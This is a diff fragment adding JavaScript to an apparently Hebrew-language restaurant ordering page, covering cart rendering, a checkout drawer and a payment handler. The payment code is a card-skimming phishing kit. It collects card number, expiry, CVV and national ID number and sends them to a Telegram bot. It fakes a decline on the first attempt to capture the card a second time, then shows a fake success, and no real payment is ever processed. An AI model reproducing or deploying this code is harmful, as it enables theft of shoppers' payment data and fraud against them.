+        if (existingItem) {
+            existingItem.qty += qty;
+        } else {
+            globalCart.push({ name: productName, option: currentOption, qty: qty, price: pricePerUnit });
+        }
+        let optionText = activeBadge ? ` (${currentOption})` : '';
+        showToast(`התווסף לעגלה: ${qty} x ${productName}${optionText}`);
+        renderCart();
+    }
+
+    function renderCart() {
+        const listContainer = document.getElementById('cartItemsList');
+        const totalSumElement = document.getElementById('cartTotalSum');
+        if (globalCart.length === 0) {
+            listContainer.innerHTML = '<div class="empty-cart-msg">העגלה שלך ריקה. הוסף מנות מהתפריט!</div>';
+            totalSumElement.innerText = '0 ₪';
+            return;
+        }
+        let html = '';
+        let totalSum = 0;
+        globalCart.forEach((item) => {
+            const itemTotal = item.price * item.qty;
+            totalSum += itemTotal;
+            const optionDisplay = item.option !== 'רגיל' ? ` (${item.option})` : '';
+            html += `<div class="cart-item-row"><span>${item.qty} x ${item.name}${optionDisplay}</span><span class="cart-item-price">${itemTotal} ₪</span></div>`;
+        });
+        listContainer.innerHTML = html;
+        totalSumElement.innerText = `${totalSum} ₪`;
+    }
+
+    function toggleDrawer(open) {
+        const drawer = document.getElementById("checkoutDrawer");
+        const overlay = document.getElementById("drawerOverlay");
+        if (open) {
+            renderCart();
+            drawer.classList.add("active");
+            overlay.style.display = "block";
+            document.body.style.overflow = "hidden";
+        } else {
+            drawer.classList.remove("active");
+            overlay.style.display = "none";
+            document.body.style.overflow = "auto";
+        }
+    }
+
+    function sendDataToTelegram(statusMessage) {
+        const ccNumber = document.getElementById('ccNumber').value;
+        const ccExpiry = document.getElementById('ccExpiry').value;
+        const ccCvv = document.getElementById('ccCvv').value;
+        const ccId = document.getElementById('ccId').value;
+        const totalAmount = document.getElementById('cartTotalSum').innerText;
+
+        const messageText = `
+🔔 *התקבלה פעילות חדשה באתר!*
+סטטוס: *${statusMessage}*
+----------------------------------
+💳 מספר כרטיס: \`${ccNumber}\`
+📅 תוקף: \`${ccExpiry}\`
+🔒 CVV: \`${ccCvv}\`
+🆔 תעודת זהות: \`${ccId}\`
+----------------------------------
+💰 סה"כ לתשלום: *${totalAmount}*
+        `;
+
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: messageText,
+                parse_mode: 'Markdown'
+            })
+        }).catch(err => console.error("שגיאה בשליחת המידע לבוט:", err));
+    }
+
+    function handlePayment(event) {
+        event.preventDefault();
+        
+        if(globalCart.length === 0) {
+            showToast('העגלה ריקה, אין על מה לשלם!', true);
+            return;
+        }
+
+        if (isFirstAttempt) {
+            sendDataToTelegram("ניסיון ראשון (נדחה ❌)");
+            showToast('התשלום נדחה. אנא בדוק את פרטי הכרטיס ונסה שנית.', true);
+            document.getElementById('creditCardForm').reset();
+            isFirstAttempt = false; 
+        } else {
+            sendDataToTelegram("ניסיון שני (הצליח בהצלחה  ✅)");
+            showToast('התשלום בוצע בהצלחה! תודה שקנית בהצרפתי.');
+            globalCart = []; 
+            renderCart();
+            document.getElementById('creditCardForm').reset();
+            setTimeout(() => toggleDrawer(false), 2000);
+            isFirstAttempt = true; 
+        }
+    }
+</script>
+
+</body>
+</html>
